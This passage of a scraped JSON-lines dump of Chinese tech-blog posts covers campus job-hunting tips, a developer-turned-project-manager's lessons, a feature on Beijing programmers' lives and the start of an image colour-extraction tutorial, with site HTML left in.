id=\"面试要不要穿正装\">面试要不要穿正装？</h3>\n<p>要不要穿正装，取决于你面试的是什么岗位。</p>\n<p>如果你面的是销售岗位，那毫无疑问，无论刮风下雨，无论烈日炎炎，都要穿西装打领带。不过你放心吧，校招面试的地方一般都是在酒店等有空调的地方，不会太热。</p>\n<p>如果你面试的是屌丝程序员岗位，着装是没有特别的要求的，不要太随意即可。穿个大头鞋去面试是肯定不允许的。当然了，短袖<strong>衬衫</strong>肯定是要比短袖<strong>T恤</strong>要更有精气神儿。这个你们就自己决定吧。</p>\n<p>如果你面试的是其他岗位，是否要穿正装，你最好是提前问清楚（问学长学姐、问其他面试的人等）。</p>\n<h3 id=\"该如何谈薪资\">该如何谈薪资</h3>\n<p>校招的薪资一般都是白菜价（统一价），这个没什么好谈的。除非你能力非凡，拿到 special offer，那当然可以跟hr谈一谈。</p>\n<h3 id=\"成绩单的原件一定要放在自己手里留着\">成绩单的原件一定要放在自己手里留着</h3>\n<p>有些公司面试，会看你的成绩单。有些同学在校期间是学霸，会主动把成绩单放在简历下方递给面试官。</p>\n<p>我需要提醒你的是：把成绩单的<strong>复印件</strong>给别人就好，请你自己妥善保管好<strong>原件</strong>。</p>\n<h3 id=\"简历可能要投很多次但一定要有耐心\">简历可能要投很多次，但一定要有耐心</h3>\n<p>一般来说，投递十家公司，如果能有一家公司给你回应，那就算很不错的了。所以，你一定不要气馁，多投一点，没关系。而且，在投递的过程中，请不断完善简历。</p>\n<h2 id=\"我自己的校招经历\">我自己的校招经历</h2>\n<p>我可以比较自豪的说，我是毕业于985院校的研究生。我也可以很自豪的说，在我研三找工作的时候，你能想到的任何一家有名气的互联网公司，都会来我们学校做招聘。</p>\n<p>但经过一个多月的海投，我最终只拿到了两家公司的offer：中兴公司 和 H公司。</p>\n<p>很遗憾，那些你能想到名字的互联网公司，我都投过简历，但都挂了，无一幸免。眼看着我们班的其他同学手里的offer，覆盖了每一家大型互联网公司，我这心里真不是滋味。</p>\n<p>我的室友是班上公认的学霸（我在读研期间，宿舍是二人间），专业能力也非常强，很多同学平时遇到上问题都是向他请教。可惜，他到了十月份的时候，手里一个offer都没有，最后去了老家那边的国家电网，做一个小镇的无名码农。</p>\n<p>关于校招的内容，我就写到这里。针对校招，如果你有好的建议、你踩过了哪些坑、你有推荐的资源或网站，欢迎在文本的下方留言。</p>\n<p>想看看我对社招的看法吗？且听下文分解。</p>\n<h2 id=\"最后一段\">最后一段</h2>\n<p>有人说，找工作全靠运气。但我认为：在运气来临之前，越努力，越幸运。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114356\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114356votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114356\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/4e2da4795d7525d292c45ac4cc7df0bcacf45e47.jpg"}
{"title": "从技术转管理，我做了什么来拯救自己？", "url": "http://blog.jobbole.com/113815/", "create_date": "2018/09/04", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/11/90129c6662feee86738bd3663ce83108.png"], "url_object_id": "995c51d19889b2c10e368d3d765eb0bc", "praise_nums": 2, "fav_nums": 2, "comment_nums": 2, "tags": "职场,管理,职场", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/lxtalx\">zer0Black</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>我是一名新手项目经理，转项目管理岗1年半。在做管理之前，我是一名开发。也就是说，我是最常见的技术转管理了。</p>\n<p>最开始，我极度不适应这个岗位。很累，但是不见成效。经过一年多的摸索，我终于在工作中总结出了一些心得，一些套路。所以我想给技术转管理的同学们讲一讲：</p>\n<p>我做了什么，来拯救自己</p>\n<h2 id=\"个人背景和公司背景\">个人背景和公司背景</h2>\n<p>1.目前为止工作4年半，也就是说，我做了3年开发，1年半管理<br>\n2.我是一名野生程序员（就是非计算机专业毕业）<br>\n3.我写过Android、iOS、web页面、java后端、python后端等等，看起来像传说中的全栈程序员。但其实心知肚明，我就是那种啥都会但啥也不行的程序员<br>\n4.公司此前做产品，后来在产品的基础上转型外包扩大规模<br>\n5.公司转型的基础上，我也转型成了管理<br>\n6.我司项目经理是一个专门的职位，负责项目管理、技术架构、客户对接。总之项目的一切相关问题，包括技术问题，都由项目经理负责</p>\n<h2 id=\"我做了什么\">我做了什么</h2>\n<h4 id=\"事必躬亲会毁了团队也会毁了自己\">事必躬亲，会毁了团队也会毁了自己</h4>\n<p>这恐怕是所有从技术转管理的人，都会犯的通病。我刚开始带团队的时候，核心代码都要自己写。然后看同事进度的时候总是嫌这个慢，那个不行的。看不下去了索性自己上手吭哧吭哧写好。弄得自己非常疲惫。</p>\n<p>通常技术能力强的人，更有机会转型管理岗。所以在带团队的过程中，总是情不自禁的亲自动手完成别人应该做的事情。最终结果就是总会替代同事做他们自己本应该做的事情。</p>\n<p>但这个行为对管理者来说，只会让管理者越来越疲惫。而对整个团队来说，更是温水煮青蛙，一步一步把团队带进深渊。管理者负担太多工作，导致团队长期无法成长。轻则导致管理者累崩。重则导致项目崩塌、团队分崩离析。</p>\n<p><strong><em>我应该怎么办：</em></strong><br>\n实际上，影响别人去做好一件事，比亲自去做要难的多。而我处理这个问题的方式<br>\n1.忍住自己亲自动手的心理<br>\n2.复杂任务拆解细化，分派任务时明确任务目标和验收标准<br>\n3.分派任务时给予同事鼓励，对他们保持充分信任<br>\n4.有难度的任务，提供一定的辅助或者培训</p>\n<h4 id=\"多想多说多做\">多想、多说、多做</h4>\n<p>我开始带团队的时候，一直忙于处理各种各样的项目问题，写代码、沟通需求、进度汇报、现场演示。大部分时间都埋头于项目本身，以为只要把项目做好，按时交付就行。做的太多， 导致思考的时间少了，对团队同事的关注也就少了。</p>\n<p>而一个团队领导者，多做是应该的，更重要的是多思考，多说</p>\n<p><strong><em>思考什么：</em></strong><br>\n1.项目干系人是否清楚，干系人不清楚会导致项目管理混乱，出的东西不满足要求<br>\n2.需求是否合理，需求是否可以优化、技术架构是否满足需求<br>\n3.功能是否拆解到位，任务分派是否可合理<br>\n4.若尝试新技术，是否有把握在出问题的时候力挽狂澜<br>\n5.团队成员状态如何，要如何激励他们<br>\n6.项目流程是否合理，如何改进<br>\n7.项目成本如何控制，时间节点如何把握，质量如何保证</p>\n<p>以上都是我目前每个项目都会思考的问题。项目管理者一定要告诫自己：<code>不要用战术上的勤奋掩盖战略上的懒惰</code></p>\n<p><strong><em>说什么：</em></strong><br>\n1.需求不清楚要问<br>\n2.需求可以优化要说，不要闷声发大财，坑的是自己<br>\n3.有困难处理不了要及时汇报给领导，悉知客户<br>\n4.团队成员有问题要给予正确指导，而不是放任自由<br>\n5.进度情况、项目情况要积极和客户保持沟通</p>\n<h4 id=\"不仅是监督更要是指引\">不仅是监督，更要是指引</h4>\n<p>“那个功能写完了吗？”；“这个功能怎么还没做好”；“你这个东西什么时候能够写完”。</p>\n<p>以上是我日常工作中最常做的事情，即便到了目前，我依然在做这些事。监督催促同事干活！每天像个监工一样，漫步在同事周围，监督他们的进度，在他们耳边逼逼叨。</p>\n<p>但我认为，催促同事干活的不应该是项目经理，而是项目流程，是规则。每个人明确自己的角色，各司其职，由规则约束着大家前行。而不是简单靠项目经理赶着大家往前走。</p>\n<p>但我并没有做好这个工作，目前还是处于制定计划、监督执行的死循环中。对于规则、流程只是有个模糊的想法，还不成型，也未经试验。暂不与大家分享。</p>\n<h4 id=\"救火能力固然重要但更要防范于未然\">救火能力固然重要，但更要防范于未然</h4>\n<p>我由技术转管理的初期，最擅长的事情就是技术。所以一直在项目中充当救火队员的角色。</p>\n<p>有突发情况？我自己来；没有人能攻克技术难点？那我自己来；开发了很久，发现需求理解错误？咔咔咔自己一顿改；总之就是这有问题，咔咔咔自己一顿弄，那有问题，嗒嗒嗒自己一顿搞。总用自己的技术能力挽救项目中的各种突发情况。</p>\n<p>而作为一个项目管理者，救火能力固然重要，要在关键时刻能够站出来力挽狂澜。但更重要的，我想是如何去避免突发情况吧。而要避免突发情况，就要思考如何做好风险管理。提早做好准备，把可能出现的未知风险扼杀在襁褓中。</p>\n<p>在IT项目管理中，我认为风险主要存在于以下几点，应思考准备以便规避风险：<br>\n1.需求变更。开发中需求变更是难免的，但如何控制需求变更，如何管理需求变更是我们着重要考虑的问题。SCALPEL方法，大家可以了解一下<br>\n2.项目干系人不清楚，导致项目需求分歧<br>\n3.技术难点预估不足。总是会存在开发过程中才发某项功能无法实现或者实现成本过高，这主要是由于前期对需求理解不足，对自我或团队太自信造成的<br>\n4.计划制定问题。开发计划制定有问题，可能由于错误的估计了团队的能力，项目的难度造成的。计划风险通常是由项目经理自己造成，需自我强化、学习、思考来避免此问题<br>\n5.组织成员问题。开发成员不足、人员离职、其它项目需紧急支援人手、团队沟通不畅都可能引起此问题<br>\n6.流程风险。过于流程化，导致流程工作占用太多开发时间，流程和灵活是一对冲突的概念。如何解决项目管理中流程化和灵活度的问题，我认为是项目经理较重要的能力之一<br>\n7.性能问题。开发过程中，最怕的是功能做完了，最后发现性能不行。导致前期开发工作全白费。所以在需求阶段，软件的用户量，数据量都是要考虑在内的。在开发之初，就要在程序设计过程中将性能问题考虑进去</p>\n<h4 id=\"保持内心强大\">保持内心强大</h4>\n<p>项目管理是一个磨人的工作。虽然外面说要做风险管理，但突发情况避免不了。一个合格的项目管理者，要有泰山崩于前而色不变的内心。</p>\n<p>需求变了不要紧、计划变了不要紧、成员情况发生变化不要紧。毕竟我们都知道<code>世界上唯一不变的就是变化</code>，尽可能的给自己准备好<code>Plan B</code></p>\n<h4 id=\"背黑锅要上邀功也要上\">背黑锅要上，邀功也要上</h4>\n<p>我相信各位做开发的时候，最讨厌的就是那种黑锅你背，有功他领的leader。既然如此，希望我们也不要变成这样的人。</p>\n<p>项目经理嘛，统管这个项目的一切。项目出了问题，不管因为什么原因，都一定是项目经理的责任。你的同事可能在项目里表现不佳，你的客户可能经常变更需求。不管多少理由，都不是你甩锅的理由。有锅一定要自己扛着，所以，<code>背黑锅要上</code>。</p>\n<p>做的好，也要说出来。超出客户预期的项目闪光点，要告诉客户团队的优秀。项目完成的不错，要告诉老板团队的优秀。让客户让老板知道你们团队做的好，下一次他们才会给你们更充分的信任。项目成员表现优秀的地方，不光要表扬，也要和上级说。你是和你团队成员接触最紧密的人，他们的有点别人不知道，但你知道。所以他们优秀的地方，要宣扬，要让别的部门知道，要让上级知道。所以<code>邀功也要上</code>。</p>\n<p>在帮派里，不能为兄弟们挡刀并引领兄弟们前进的老大是不值得追随的，弟兄们在你手下做事受尽委屈，争不了一口气，那这个老大也做不长。</p>\n<p>技术出身的管理者中，我相信<code>背黑锅要上</code>是大家都能做到的。但技术人员不善言辞，总是闷头干活，不会表达。所以要适当学会邀功，为团队邀功。希望大家都能学会<code>邀功也要上</code></p>\n<h4 id=\"不要抛弃技术它可能是你的救命良药\">不要抛弃技术，它可能是你的救命良药</h4>\n<p>做项目管理以后，尤其是像我现在这种一个人带多个项目的情况。管理工作会占用每天极多的时间。这是工作本身需要你做的，无可厚非。我想说的是，即便如此，也要保证自己对技术的学习。</p>\n<p>了解新技术也好，写写开源项目也好，总之要保持对技术的持续学习。他总能在你需要的时候帮到你。</p>\n<p><code>学如逆水行舟,不进则退</code>，与大家共勉</p>\n<h2 id=\"总结\">总结</h2>\n<p>总体而言，我认为一个新手项目经理，要学会以下事情：<br>\n1.要学会带领团队成长，不要事必躬亲<br>\n2.要多进行思考<br>\n3.要学会风险管理<br>\n4.要保持内心的强大<br>\n5.要学会邀功</p>\n<p>以上，就是我想和大家分享的内容，其中很多点，我自己做的也不是很好，依然需要自我练习和努力。希望各位技术转管理的同学，都能尽快适应自己的工作。</p>\n<article><!-- JiaThis Button END -->\n</article>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113815\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113815votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113815\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/lxtalx\">zer0Black</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/lxtalx\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/2016/02/7345325ae6842e24247f60a113f61ce3.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            目前工作为移动开发，兴趣广泛，计算机各方面均有强烈兴趣。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/lxtalx\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/lxtalx/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/lxtalx/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 26</a> · <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/u/1851062185\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/f49c8437c74dd90a906b7a9579e6520f3044c962.jpg"}
{"title": "走近北京后厂村程序员的真实生活：“拿命换钱”", "url": "http://blog.jobbole.com/114364/", "create_date": "2018/09/09", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/a3f700ca2ede780d76b0ad474852fa91.jpg"], "url_object_id": "35883a1e8a47f14c13e17a27f2156639", "praise_nums": 1, "fav_nums": 0, "comment_nums": 0, "tags": "职场,程序员", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.jwview.com/\">中新经纬/赵佳然</a>   </div><p>北京的西北角是个特别的区域，这里汇集了众多互联网及IT企业，实力雄厚的上市公司将自家logo悬挂在大厦的顶端，而刚起步的创业公司也会选择在这里租下一亩三分地。</p>\n<p>中关村、上地、西二旗、后厂村……它们成为了一个个地标，而在这里工作的年轻人，总是第一时间被打上“码农”“程序员”的标签。在大家眼中，他们往往身着格子衬衫，头戴耳机身背双肩包，披星戴月地上下班，每天十几个小时面对着电脑屏幕。</p>\n<div style=\"text-align: center;\"><img class=\"aligncenter\" src=\"//n.sinaimg.cn/tech/crawl/162/w550h412/20180909/XkLf-hivtsyk4553107.jpg\" alt=\"西二旗地铁站 中新经纬赵佳然摄\">西二旗地铁站</div>\n<p>我们习惯把他们看作一个整体，从性格、着装到消费水平都大致定型。然而，他们也许曾在某个地铁站多次擦肩而过，但每个人心中的目标、理想和焦虑，都各不相同。</p>\n<p><strong>我把家从三环里搬到了六环外</strong></p>\n<p>老田今年28岁，北京生北京长，是个标准的“土著”。10年前的他大概没有想过，自己会来到当时名不见经传的后厂村工作。</p>\n<p>2013年夏天，老田本科毕业，专业是当年正吃香的计算机与科学技术。他顺利地找到了一份某大型电信公司的内勤工作，但入职后发现，工作的内容与所学的专业知识并无相关。</p>\n<p>“就是天天处理人际关系，没别的。”他回忆道。</p>\n<p>不是没有考虑过换行，老田曾经要求过调岗，但却在面试的时候受了挫。“对方本来要问我一个专业问题，后来突然看了看我简历说：‘你是13年毕业的啊，那这个你可能没学过。’后来我就没怎么想着调岗的事了，想看看其他机会吧。”</p>\n<p>不过这份工作也有极大的优势：工作量少，离家近。老田每天可以8点起床，溜达15分钟到单位，下午5点半之前到家，琢磨晚上给爱人做点什么吃。老田最大的爱好就是做饭，人生理想是拥有属于自己的饭馆，不过这个目标现在看来还远得很。</p>\n<p>今年年初，也是老田结婚的第二年，他们摇号中了一套共有产权房，这意味着两人从无贷一身轻的状态，变成了每个月需还款7000多元。这突然的改变，也让他不得不再次审视自己的收入情况。“必须要多攒点钱了。”他对自己说。</p>\n<div style=\"text-align: center;\"><img class=\"aligncenter\" src=\"//n.sinaimg.cn/tech/crawl/58/w550h308/20180909/sITD-hivtsyk4553147.jpg\" alt=\"清晨的后厂村路，老田每天的必经之地 受访者供图\">清晨的后厂村路，老田每天的必经之地 受访者供图</div>\n<p>经过熟人介绍，他来到了“大名鼎鼎”的后厂村，在一家央企做工程师。还没开始体会到工作的高强度，通勤的问题就先来了：家住在东三环内，公司在北五环外，高峰期堵得严严实实，咋办？</p>\n<p>与爱人商量之后，老田决定工作日住到六环外的亲戚家。“往北走高速，开20多分钟就到了，回家直接睡觉。”就这样，从公司到住处，从工作到睡觉的循环开始了。</p>\n<p>由于已经4年没上手专业技能，突如其来的高强工作量让他发懵。他坦言，工作以来，这是头回一想到上班就开始焦虑。三个月过去，好不容易熟悉了基本操作，但工作压力依然压得他喘不过气。喝不惯咖啡的他，每天中午和其他同事一样，需要在躺椅上休息近一小时，否则整个下午都会浑浑噩噩。</p>\n<p>一日下班后，老田随手抓了抓脑袋，却惊讶地发现掉了满桌的头发。“我觉得这份工作就是在拿命换钱。”他说。</p>\n<div style=\"text-align: center;\"><img class=\"aligncenter\" src=\"//n.sinaimg.cn/tech/crawl/59/w550h309/20180909/Svxt-hivtsyk4553170.jpg\" alt=\"老田办公室的躺椅，同事们几乎人手一个 受访者供图\">老田办公室的躺椅，同事们几乎人手一个 受访者供图</div>\n<p>其实，老田从来没放弃过开饭馆的梦。他自己也明白，目前的积蓄还无法支撑起这个目标，同时后厂村的高强度作业也不是长久之计。“先干两年，等把知识学到手，也算是留了个后路，以后就算创业失败了，也能养家糊口。”眼看“奔三”了，下一代的计划也渐渐提上日程，他便愈发不敢放松对自己的要求。</p>\n<p>晚上9点，老田揉了揉发涩的眼睛，发动汽车，开往六环外的住所。高速走得很顺，车里放着《北京土著》，顺便想想周末该做什么新菜。他突然觉得，要是这段路再长一点，也挺好的。</p>\n<div style=\"text-align: center;\"><img class=\"aligncenter\" src=\"//n.sinaimg.cn/tech/crawl/162/w550h412/20180909/6AtK-hivtsyk4553202.jpg\" alt=\"晚上10点，后厂村的办公大楼仍灯火通明\">晚上10点，后厂村的办公大楼仍灯火通明</div>\n<p><strong>“程序媛”和你们想象得不太一样</strong></p>\n<p>小徐在中关村上班，是个程序员，性别女。</p>\n<p>她知道女性程序员在大众眼里的模样：要么，就是从不化妆，戴着厚厚的眼镜，穿着上也从不在意，在人群里是最不起眼的存在；要么，就是只顾打扮不顾业务，利用着与生俱来的“性别优势”，自然地索求同事们的帮助。</p>\n<p>她认为自己与两者均无相似之处。</p>\n<p>在求职时，小徐的同学们或多或少地抱怨过用人单位的不公平待遇，即同样条件下，招收女性程序员的可能性较小。在这份需脑力与体力兼备的工作中，女性似乎确实不占优势，但幸运的是，许多大型公司在招聘时注重性别的均衡，她也未曾遭受异样的审视。“我就职的这家外企比较重视员工的diversity(差异性)，因此团队里的女性不少，很多还是女博士。”她回忆道。</p>\n<div style=\"text-align: center;\"><img class=\"aligncenter\" src=\"//n.sinaimg.cn/tech/crawl/162/w550h412/20180909/XJfh-hivtsyk4553239.jpg\" alt=\"通勤时段，人人都是“低头族” 中新经纬 赵佳然摄\">通勤时段，人人都是“低头族”</div>\n<p>小徐去年研究生毕业，从香港来到北京求职的她，选择中关村并非为了高薪，而是希望能继续积累知识。“希望我的工作能兼顾我的专业和兴趣，同时能给我不断提升自我的机会。”经过筛选，最终她就职于某外企的研究机构，与云技术、人工智能等尖端科技打交道。</p>\n<p>太多年轻人初入职场时也怀着学习的心态，但不久后便与繁忙的节奏和升职加薪的烦恼妥协，开始得过且过。小徐却认为，自己所在团队的氛围起到了带头作用，大家在头脑风暴中不断思考、沉淀的过程，是她在工作中最欣赏的部分。“我不喜欢那种领导让做什么就做什么的节奏，太死板，久而久之脑袋都麻木了。”</p>\n<p>虽然目前的工作尽如人意，但小徐还面临着大部分“程序媛”都避不开的问题：来自亲人朋友的无形压力。随着IT圈“赚5万花5千”“过度劳动”“脱发”等吐槽越来越深入人心，身边的人自然会产生担忧：身体状况怎么样？平时有自己的时间吗？非要做这行不可吗？</p>\n<div style=\"text-align: center;\"><img class=\"aligncenter\" src=\"//n.sinaimg.cn/tech/crawl/136/w550h386/20180909/n19M-hivtsyk4553275.jpg\" alt=\"小徐的钢琴 受访者供图\">小徐的钢琴 受访者供图</div>\n<p>小徐多次与母亲提及这个话题，但都以她的坚持而结束。但她潜意识里也存在着焦虑。虽然入职只有一年光景，但她已经从周围同事的身上看到了自己可能的未来，并不时怀疑：我可以做到那么优秀吗？</p>\n<p>“刚入职的时候抱有热情和冲劲很正常，但眼看着同事和领导资历越高，节奏越快，我也会担心自己以后能否平衡工作和生活，会遇到什么样的瓶颈。总之我不希望工作侵吞我所有的生活，如果有合适机会的话，我或许会考虑跳槽，但目前的职业方向还是不会变的。”小徐说。</p>\n<p>然而，尽管有着迷茫和顾虑，但小徐仍坚持着自己对事物的新鲜感。给自己报的成人钢琴班已经小有成效，最近正练习着《小步舞曲》。</p>\n<p>她是职场新人，是“程序媛”，也是“北漂”，但最重要的，她是她自己。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114364\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114364votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114364\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/44c2919ba48fd2a8c45629c53265ad798043813c.jpg"}
{"title": "图像主题色提取算法", "url": "http://blog.jobbole.com/114372/", "create_date": "2018/09/12", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/499bf16cb3adc6934bf94650bf5b4616.png"], "url_object_id": "e65a91ff534a81a8cc0b43c61188d785", "praise_nums": 1, "fav_nums": 0, "comment_nums": 0, "tags": "IT技术,算法", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://blog.rainy.im/2015/11/24/extract-color-themes-from-images/\">Yusheng</a>   </div><p>许多从自然场景中拍摄的图像，其色彩分布上会给人一种和谐、一致的感觉；反过来，在许多界面设计应用中，我们也希望选择的颜色可以达到这样的效果，但对一般人来说却并不那么容易，这属于色彩心理学的范畴（当然不是指某些伪神棍所谓的那种）。从彩色图像中提取其中的主题颜色，不仅可以用于色彩设计（参考网站：<a href=\"http://design-seeds.com/\">Design Seeds</a>），也可用于图像分类、搜索、识别等，本文分别总结并实现图像主题颜色提取的几种算法，包括颜色量化法（Color Quantization）、聚类(Clustering)和颜色建模的方法（颜色建模法仅作总结），源码可见：<a href=\"https://github.com/rainyear/ImageColorTheme\">GitHub: ImageColorTheme</a>。</p>\n<section>\n<h1>1. 颜色量化算法</h1>\n<p>彩色图像一般采用RGB色彩模式，每个像素由RGB三个颜色分量组成。随着硬件的不断升级，彩色图像的存储由最初的8位、16位变成现在的24位、32<a href=\"https://zh.wikipedia.org/wiki/%E7%9C%9F%E5%BD%A9%E8%89%B2\">真彩色</a>。所谓全彩是指每个像素由8位（$2^8$=0~255）表示，红绿蓝三原色组合共有1677万（$256*256*256$）万种颜色，如果将RGB看作是三维空间中的三个坐标，可以得到下面这样一张色彩空间图：</p>\n<p><a href=\"http://www.pyimagesearch.com/2014/12/01/complete-guide-building-image-search-engine-python-opencv/\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/a1a9eb3d2a3819ce5e549378e91707f4.png\" alt=\"RGB color cube\"></a></p>\n<p>当然，一张图像不可能包含所有颜色，我们将一张彩色图像所包含的像素投射到色彩空间中，可以更直观地感受图像中颜色的分布：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/de654046d5d5bf7b537be4b0e8b103d6.png\" alt=\"Image in Color space\"></p>\n<p>因此颜色量化问题可以用所有<a href=\"https://en.wikipedia.org/wiki/Vector_quantization\">矢量量化（vector quantization, VQ）</a>算法解决。这里采用开源图像处理库 <a href=\"http://www.leptonica.com/\">Leptonica</a> 中用到的两种算法：中位切分法、八叉树算法。</p>\n<h2>1.1. 中位切分法（Median cut）</h2>\n<p><a href=\"https://github.com/lokesh/color-thief\">GitHub: color-theif</a> 项目采用了 Leptonica 中的用到的（调整）中位切分法，Js 代码比 C 要易读得多。中位切分算法的原理很简单直接，将图像颜色看作是色彩空间中的长方体（VBox），从初始整个图像作为一个长方体开始，将RGB中最长的一边从颜色统计的中位数一切为二，使得到的两个长方体所包含的像素数量相同，重复上述步骤，直到最终切分得到长方体的数量等于主题颜色数量为止。</p>\n<p>Leptonica 作者在报告 <a href=\"http://collaboration.cmc.ec.gc.ca/science/rpn/biblio/ddj/Website/articles/DDJ/1994/9409/9409e/9409e.htm\">Median-Cut Color Quantization</a> 中总结了这一算法存在的一些问题，其中主要问题是有可能存在某些条件下 VBox 体积很大但只包含少量像素。解决的方法是，每次进行切分时，并不是对上一次切分得到的所有VBox进行切分，而是通过一个优先级队列进行排序，刚开始时这一队列以VBox仅以VBox所包含的像素数作为优先级考量，当切分次数变多之后，将体积*包含像素数作为优先级。</p>\n<p>Python 3 中内置了<code>PriorityQueue</code>：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67035440d664578184\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button 